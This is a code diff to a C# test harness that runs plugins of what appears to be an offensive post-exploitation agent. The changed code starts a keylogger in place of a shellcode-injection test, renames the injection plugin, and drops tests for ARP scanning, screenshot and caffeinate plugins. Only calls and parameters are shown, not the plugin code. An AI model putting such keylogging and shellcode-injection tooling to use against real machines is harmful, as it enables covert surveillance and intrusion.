@@ -21,7 +21,13 @@ namespace TestPluginLoader
         public static AssemblyLoadContext loadcontext = new AssemblyLoadContext("commands");
         static async Task Main(string[] args)
         {
-            await TestShellcodeInject();
+            Console.WriteLine("Starting Keylogger.");
+            Task.Run(() => TestKeylogger());
+            Console.WriteLine("Delaying.");
+            await Task.Delay(10000);
+            Console.WriteLine("Done.");
+            var res = await TaskResponseHandler.GetTaskResponsesAsync();
+            Console.WriteLine(res.FirstOrDefault());
             Console.WriteLine("Finished.");
             Console.ReadKey();
         }
@@ -72,7 +78,7 @@ namespace TestPluginLoader
             //parameters.Add("functionName", "go");
             //parameters.Add("timeout", "60");
             parameters.Add("task-id", "1");
-            IPlugin plugin = new ShellcodeInject();
+            IPlugin plugin = new InjectShellcode();
 
             plugin.Execute(parameters);
 
@@ -110,36 +116,6 @@ namespace TestPluginLoader
             Dictionary<string, string> parameters = new Dictionary<string, string>();
             parameters.Add("task-id", "1");
             new Ps().Execute(parameters);
-            var res = await TaskResponseHandler.GetTaskResponsesAsync();
-            Console.WriteLine(res.FirstOrDefault());
-        }
-        static async Task TestArp()
-        {
-            Dictionary<string, string> parameters = new Dictionary<string, string>();
-            parameters.Add("task-id", "1");
-            parameters.Add("cidr", "10.10.0.2/24");
-            parameters.Add("timeout", "60");
-            new Arp().Execute(parameters);
-            var res = await TaskResponseHandler.GetTaskResponsesAsync();
-            Console.WriteLine(res.FirstOrDefault());
-        }
-        static async Task TestCaffeinate()
-        {
-            Dictionary<string, string> parameters = new Dictionary<string, string>();
-            parameters.Add("task-id", "1");
-            parameters.Add("cidr", "10.10.0.2/24");
-            parameters.Add("timeout", "60");
-            new Caffeinate().Execute(parameters);
-            var res = await TaskResponseHandler.GetTaskResponsesAsync();
-            Console.WriteLine(res.FirstOrDefault());
-        }
-        static async Task TestScreenShot()
-        {
-            Dictionary<string, string> parameters = new Dictionary<string, string>();
-            parameters.Add("task-id", "1");
-            parameters.Add("cidr", "10.10.0.2/24");
-            parameters.Add("timeout", "60");
-            new Screenshot().Execute(parameters);
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
         }
